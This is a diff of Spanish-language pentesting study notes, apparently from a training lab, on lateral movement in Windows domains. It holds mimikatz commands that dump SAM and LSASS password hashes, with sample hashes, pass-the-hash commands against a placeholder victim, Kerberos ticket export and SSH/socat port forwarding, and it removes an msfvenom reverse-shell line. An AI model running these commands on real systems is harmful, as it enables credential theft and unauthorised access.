@@ -212,16 +212,131 @@ Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 ```
 
-# Ejemplo:
+# Autenticación Alternativo
 
-para añadir a nuestro el dominio a nuestra red deberemos irnos a resolv.conf y cambiar el dns
+Referimos datos que nosotros usamos para acceder a windows sin necesitdad de saber la contraseña. Es posible porque los protocolos de autenticación que usan windows funcionan a sí.
 
-Nos conectamos con una  shell (generamos una)
+- NTLM autenticación
+- Kerberos autenticación
+
+## NTLM
+
+![image](https://github.com/user-attachments/assets/6467ec96-a570-48d9-af12-91045b1626ce)
+
+## Pass-The-Hash
+
+El resultado de extraer credenciales del host nos puede dar privilegios. Pero si no tenemos suerte jamás crackearemo dichas contraseñas
+
+Para esto, utilizaremos la autenticación de NTLM que como todos sabemos funciona como un reto y simplemente conociendo el hash del pass. Esto es bueno porque nos podemos autentificar sin necesidad de texto plao.
+
+Para extraer los hashes podemos utilizar "mimikatz" para leer archivos locales o extraer hashes de la memoria LSASS
+
+### Extraer hash de la memoria local
+
+Este metodo hace que cogamos los hashe de la maquina local
 
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # lsadump::sam   
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 145e02c50333951f71d13c245d352b50
 ```
 
+```
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # sekurlsa::msv 
+Authentication Id : 0 ; 308124 (00000000:0004b39c)
+Session           : RemoteInteractive from 2 
+User Name         : bob.jenkins
+Domain            : ZA
+Logon Server      : THMDC
+Logon Time        : 2022/04/22 09:55:02
+SID               : S-1-5-21-3330634377-1326264276-632209373-4605
+        msv :
+         [00000003] Primary
+         * Username : bob.jenkins
+         * Domain   : ZA
+         * NTLM     : 6b4a57f67805a663c818106dc0648484
+```
+
+## Pasar hash usando linux
+
+```
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
+psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+```
+
+## Autenticación Kerberos
+
+El usuario manda el usuario y una llave encriptada o KDC usualmente ya utiliza o cargada en el controlador de dominio, kerberos nos crea un ticket para la red.
+
+El KDC crea y manda un ticket de vuelta (TGT), el usuario pide el ticket para servicios especificios, entonces se le da la llave de sesión
+
+TGT esta encriptado usando cuentas "krbtgt", el usuario no puede acceder al contenido
+
+![image](https://github.com/user-attachments/assets/36fba11e-9fb5-43a3-8d16-e38bd6109eee)
+
+Cuando el usuario quiere conectarse a la red como si fuera compartido, como en un web o base de datos, ellos usan TGT para preguntar al KDC por un TGS. Los TGS son tickets que permiten o no la conexión especifica a un usuario ya creado.
+
+![image](https://github.com/user-attachments/assets/0197e9df-8766-4f03-9786-8f32f2ba99eb)
+
+## Pass-the-Ticket
+
+Aveces es posible extraer tickets de kerberos o sesiones usando "mimikatz" El proceso normalmente requiere privilegios de "SYSTEM" en la maquina atacada
+
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+Si tenemos acceso al ticket y no a la llave de sesión correspondiente.
+
+Mientras mimikatz puede xtraer el TGT o TGS de la memoria del LSASS
+
+# Port Forwarding
+
+Muchos de las tecnicas de los movimientos laterales presentar especificos puertos disponibles para el atacante. En redes reales, normalmente los administradores bloquean los puertos o segmentan la red
+
+## Tuneles SSH
+
+El primero protocolo porsupuesto es el SSH llamado "SSH Tunneling". Este protocolo como ya sabemos viene de sistemas linux con un OpenSSH
+
+Se puede usar de diferentes formas dependiendo de la situacion.
+
+![image](https://github.com/user-attachments/assets/7186191d-7812-4a9d-a74f-e5ddf2a6f27b)
+
+## SSH Reenvio de puertos
+
+En un ejemplko, imagina que un firewall no nos deja pasar por dicho puerto, pero otro servidor si puede, utilizariamos por ejemplo los puertos del mismo ssh que nos hemos conectado para ir al siguiente punto.
+
+![image](https://github.com/user-attachments/assets/35ce361b-660e-4fd1-9b7d-0983095f3ea1)
+
+```
+ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+```
+
+## SSH Reenvío de puertos local
+
+![image](https://github.com/user-attachments/assets/b83f6aa8-af08-4abc-b511-69fdb564551a)
+
+```
+ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+```
+
+
+## Reenvío de puertos con socat
+
+```
+socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+```
+
+![image](https://github.com/user-attachments/assets/1c0d09ab-62fa-4c66-842f-cd9bd7663bef)
 
 
 
